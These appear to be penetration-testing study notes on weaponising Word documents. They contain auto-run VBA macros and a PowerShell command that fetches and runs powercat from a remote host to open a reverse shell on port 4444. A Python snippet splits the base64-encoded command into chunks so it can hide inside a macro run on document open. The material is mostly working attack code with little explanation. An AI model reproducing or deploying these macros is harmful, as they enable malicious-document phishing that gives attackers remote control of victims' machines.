> **.doc** and **.docm** file types have macro saved in the document. **.docx** does not.

Macro to run Powershell:
```vb
Sub AutoOpen() 
	MyMacro 
End Sub 

Sub Document_Open() 
	MyMacro 
End Sub 

Sub MyMacro() 
	CreateObject("Wscript.Shell").Run "powershell" 
End Sub
```


## Reverse shell

PS command to be used:
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

Use Python to split the b64 encoded version of the above command into chunks of 50 chars each:
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." 

n = 50 

for i in range(0, len(str), n): 
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Macro to create reverse shell in Powershell using Powercat:
```vb
Sub AutoOpen() 
	MyMacro 
End Sub 

Sub Document_Open() 
	MyMacro 
End Sub 

Sub MyMacro() 
	Dim Str As String 
	
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" 
	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" 
	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB" 
	... 
	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA" 
	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA" 
	Str = Str + "A== "
	
	CreateObject("Wscript.Shell").Run Str
End Sub


```
